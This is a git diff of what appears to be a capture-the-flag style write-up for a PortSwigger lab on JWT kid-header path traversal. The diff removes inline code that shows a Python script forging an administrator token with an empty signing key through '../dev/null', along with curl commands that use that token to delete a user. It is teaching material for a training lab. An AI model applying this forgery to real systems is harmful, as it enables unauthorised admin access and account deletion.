@@ -10,6 +10,7 @@ lang: "en"
 
 import CollapsiblePartial from '../../components/CollapsiblePartial.astro';
 import PartialContainer from '../../components/PartialContainer.astro';
+import CodeSnippet from '../../components/CodeSnippet.astro';
 
 ## Necessary Background Concepts To Solve The Lab
 
@@ -22,9 +23,7 @@ import PartialContainer from '../../components/PartialContainer.astro';
 
 Let's explore the lab's login page directly and log in to get a valid JWT session token:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/login" | cat
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/01-bash.sh" />
 
 > **Command breakdown**: \
 `-s` = silent mode (no progress meter) \
@@ -32,22 +31,11 @@ curl -s "https://<lab-url>.web-security-academy.net/login" | cat
 
 The login page has a simple form with a CSRF token:
 
-```html
-<form class=login-form method=POST action="/login">
-    <input required type="hidden" name="csrf" value="jZEVDXEhHL3f8X18WduPNbFU266yB8PE">
-    <label>Username</label>
-    <input required type=username name="username" autofocus>
-    <label>Password</label>
-    <input required type=password name="password">
-    <button class=button type=submit> Log in </button>
-</form>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/02-html.html" />
 
 Let's log in with the provided credentials:
 
-```bash
-curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=jZEVDXEhHL3f8X18WduPNbFU266yB8PE&username=wiener&password=peter"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/03-bash.sh" />
 
 > **Command breakdown**: \
 `-D -` = dump response headers to stdout \
@@ -55,17 +43,11 @@ curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=jZEVDXEhHL
 
 Response:
 
-```
-HTTP/2 302 
-location: /my-account?id=wiener
-set-cookie: session=eyJraWQiOiJkYWRlMTg2ZC02ZDE5LTQ1ODQtYWIyNy03Mzc5NzVlMTYxMWYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoid2llbmVyIn0.whMw5vTopqo88l65CSzqHS4F_YMCnfOPtJBCwH9CPw4; Secure; HttpOnly; SameSite=None
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/04-plain.http" />
 
 The session cookie is a JWT token. Let's decode it to understand its structure:
 
-```bash
-echo "eyJraWQiOiJkYWRlMTg2ZC02ZDE5LTQ1ODQtYWIyNy03Mzc5NzVlMTYxMWYiLCJhbGciOiJIUzI1NiJ9" | base64 -d | jq . | cat
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/05-bash.sh" />
 
 > **Command breakdown**: \
 `echo "..."` = output the JWT header part \
@@ -75,28 +57,15 @@ echo "eyJraWQiOiJkYWRlMTg2ZC02ZDE5LTQ1ODQtYWIyNy03Mzc5NzVlMTYxMWYiLCJhbGciOiJIUz
 
 Header output:
 
-```json
-{
-  "kid": "dade186d-6d19-4584-ab27-737975e1611f",
-  "alg": "HS256"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/06-json.json" />
 
 Now decode the payload:
 
-```bash
-echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoid2llbmVyIn0" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/07-bash.sh" />
 
 Payload output:
 
-```json
-{
-  "iss": "portswigger",
-  "exp": 1773401894,
-  "sub": "wiener"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/08-json.json" />
 
 The JWT uses **HS256** (HMAC-SHA256) for signing and includes a `kid` (Key ID) parameter in the header. According to the lab description, the server uses this `kid` parameter to fetch the relevant signing key **from its filesystem**. This is the critical detail. If the `kid` value is used to construct a file path without proper sanitization, we can exploit a **path traversal** vulnerability.
 
@@ -104,30 +73,7 @@ The idea is simple: point `kid` to `/dev/null` via a path traversal sequence. Si
 
 Let's create a Python script to forge the admin JWT:
 
-```python
-import hmac
-import hashlib
-import base64
-
-# Transforms string to base64 string
-def b64(string): return base64.urlsafe_b64encode(string).decode().rstrip('=')
-
-# Forge header with kid pointing to /dev/null via path traversal
-header = '{"kid":"../../../../../../../dev/null","alg":"HS256"}'
-
-# Forge payload with sub=administrator
-payload = '{"iss":"portswigger","exp":1773401894,"sub":"administrator"}'
-
-# Put together the message part of the JWT
-message = f"{b64(header.encode())}.{b64(payload.encode())}"
-
-# Sign with empty string (the content of /dev/null)
-signature = b64(hmac.new(b'', message.encode(), hashlib.sha256).digest())
-
-forged_jwt = f"{message}.{signature}"
-
-print(forged_jwt)
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/09-python.py" />
 
 > **Script breakdown**: \
 > The script forges an administrator JWT by:
@@ -138,32 +84,19 @@ print(forged_jwt)
 
 Expected output:
 
-```
-eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/10-plain.txt" />
 
 Let's verify by decoding the forged header:
 
-```bash
-echo "eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0" | base64 -d | jq .
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/11-bash.sh" />
 
 Output:
 
-```json
-{
-  "kid": "../../../../../../../dev/null",
-  "alg": "HS256"
-}
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/12-json.json" />
 
 Now let's access the admin panel with our forged JWT:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin" \
-  -b "session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o" \
-  | grep "carlos"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/13-bash.sh" />
 
 > **Command breakdown**: \
 `-b "session=..."` = send the forged JWT as a session cookie \
@@ -171,17 +104,11 @@ curl -s "https://<lab-url>.web-security-academy.net/admin" \
 
 Response:
 
-```html
-<span>carlos - </span>
-<a href="/admin/delete?username=carlos">Delete</a>
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/14-html.html" />
 
 We have admin access. Now let's delete the user carlos:
 
-```bash
-curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
-  -b "session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o"
-```
+<CodeSnippet file="jwt-authentication-bypass-via-kid-header-path-traversal/15-bash.sh" />
 
 The path traversal through `kid` let us **nullify the signing key and forge an admin token**, absolutely dominating the authentication system and eradicating carlos like a true <a href="https://github.com/echoesofwhoami/echoes-bat-theme" target="_blank">gigachad</a>.
 
